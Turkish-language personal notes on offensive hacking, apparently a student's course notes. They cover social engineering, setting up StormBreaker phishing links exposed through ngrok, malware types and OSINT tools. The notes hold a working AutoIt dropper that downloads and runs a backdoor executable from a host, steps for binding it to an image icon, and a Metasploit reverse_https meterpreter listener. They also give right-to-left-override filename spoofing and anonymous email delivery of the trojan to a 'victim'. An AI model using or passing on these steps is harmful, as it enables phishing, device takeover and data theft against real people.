### Sosyal Mühendislik

- Sosyal mühendislik, bir hackerın teknik açıkları değil insanları kandırarak bilgi veya erişim elde etme yöntemidir.

Yani saldırgan:

- Sistem hacklemek yerine
- İnsan psikolojisini kullanarak şifre, kod veya gizli bilgi alır.

Basit Örnekler

- Sahte e-posta gönderip “şifrenizi yenileyin” diyerek kullanıcıdan şifre almak (phishing).
- Kendini IT çalışanı gibi tanıtıp çalışanlardan parola istemek.
- Sahte bir siteye yönlendirip kullanıcı bilgilerini çalmak.

**_ StormBreaker _**

- StormBreaker, bir kişinin cihazı hakkında bilgi toplamak veya kontrol etmek için kullanılan bir araçtır. Genelde Android telefonları veya bilgisayarları hedef almak için hazırlanmış phishing tabanlı saldırılarda görülür.
  Genelde şu şekilde çalışır:

* Saldırgan bir sahte link oluşturur
* Kurban linke tıklar
* Tarayıcı üzerinden bazı bilgiler toplanır
* Bilgiler saldırganın paneline gider

  > git clone https://github.com/ultrasecurity/Storm-Breaker // >cd /opt
  > cd Storm-Breaker
  > sudo bash install.sh //hata çıktı görünebilir.Çalışıyordur
  > sudo python3 -m pip install -r requirements.txt
  > sudo python3 st.py //çalışır
  - açılan stormbreaker ekranında > ngrok http 2525

**_ ngrok _**

- Ngrok kısaca yerel bilgisayarında çalışan bir servisi internet üzerinden erişilebilir hale getiren bir araçtır.

En çok şu durumlarda kullanılır:

- Web uygulaması test etmek
- mobil uygulama backend testleri
- Webhook test etmek (Stripe, GitHub vb.)
- local projeyi müşteriye göstermek

* Senin bilgisayarın (localhost:3000)
  ↓
  ngrok
  ↓
  https://randomlink.ngrok.io
  ↓
  İnternette herkes erişebilir

* ngork üye ol
* download ngroak for linux
* ngrok config add-authotoken ... // cp
* ls //ngork'un olduğu klasöre gir
* ./ngrok config add-authotoken ...
* ./ngrok http 2525 // stormbreakerdaki localhost çalışır ordaki ip tarayıcıya cp
  -- açılan arayüzdeki linkleri kurbana açtırırsan arayüzde atılan linkle ilgili bilgiler çıkmaya başlar.

**_Malware(Zararlı yazılımlar) _**

1- Ransomware
Ransomware, bilgisayardaki dosyaları şifreleyip fidye isteyen zararlı yazılımdır.
Para verilmeden dosyalar açılmaz.

2- Spyware
Spyware, kullanıcıyı gizlice izleyen zararlı yazılımdır.
Şunları çalabilir:
• şifreler
• klavye girişleri
• kişisel bilgiler

3-Adware
Adware, kullanıcıya zorla reklam gösteren yazılımdır.
Genelde:
• tarayıcıya reklam ekler
• sürekli pop-up açar.

4-Worm (Solucan)
Worm, kendini otomatik olarak ağda yayabilen zararlı yazılımdır.
Bir bilgisayardan diğerine insan müdahalesi olmadan bulaşabilir.

5-Trojan (Truva Atı)
Trojan, faydalı program gibi görünen ama içinde zararlı kod bulunan yazılımdır.
Kullanıcı indirip çalıştırınca saldırgan sisteme erişebilir.

6-Botnet
Botnet, hackerın kontrol ettiği çok sayıda ele geçirilmiş bilgisayar ağıdır.
Bu bilgisayarlar genelde şu amaçla kullanılır:
• DDoS saldırısı
• spam gönderme
• kripto madenciliği

---

\*\*Maltego : Açık kaynak istihbaratı (OSINT) toplamak ve kişiler, domainler, IP’ler arasındaki ilişkileri görselleştirmek için kullanılan bir analiz aracıdır. Kalide yüklüdür
\*\*Sherlock :bir kullanıcı adının (username) hangi sosyal medya ve web sitelerinde kullanıldığını bulmaya yarayan OSINT aracıdır.

> apt install sherlock
> sherlock omerapaydin

---

**_ Görsel ve Backdoor Birleştirmek _**

- jpeg to icon arat// fotonun icon hali gerekli. İndirilen dosyada icon görünür
- msfvenom veya FatRat ile oluşturulan backdoor oluştur. Foto,icon ve .exe dosyasını al.

\*\* Autoit download // EXE dosyaları oluşturabiliyor. pdf-jpg.. ile (windows a yüklenir sadece)

\*\*MakeTrojan //bu kod exe dosyasıyla pdf-jpg.. birleştirir

> #include <StaticConstants.au3>
> #include <WindowsConstants.au3>

Local $urls = "url1,url2"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
shellExecute($sFile)

Next

Func \_DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.\*/", "")
$sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
Return $sDirectory
EndFunc ;==>\_GetURLImage
\*\*

- bu kodu .txt yap
- kaliyi apachi komutu ile servis yap
- Üstteki url kısımlarına "http://192.168.64.8/backdoor/android.jpg" "http://192.168.64.8/backdoor/myhttps.exe"
- Autoit Compile Script to .exe aç ve .txt dosyasını icon u gir

\*\* kurban dosyayı indirip çalıştırdığında kaliden dinlenir

> msfconsole
> use exploit>multi>handler
> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
> msf6 exploit(multi/handler) > show options
> msf6 exploit(multi/handler) > set LHOST 192.168.64.8
> msf6 exploit(multi/handler) > set LPORT 4545
> msf6 exploit(multi/handler) > exploit -j -z
> msf6 exploit(multi/handler) > exploit -l
> msf6 exploit(multi/handler) > exploit -1
> meterpreter>

**_ Uzantıları Değiştirmiş Göstermek _**

- .exe dosyası indirdiğinde kurban bunun tuzak olduğunu anlamamasını sağlamak için uzantı değiştirirlir.

- Tarayıcıdan "right to left chacter override" herhangi site veya unicode explorer fir. copy yap

-oluşan .exe doyasını isim değiştirme açılır. Sonuna yapıştır. İsim değiştir

**_ Sahte Email ile Trojan yollamak _**

- tarayıcı da "anonymous email sender" ile aldatıcı bir mail gönderilebilir
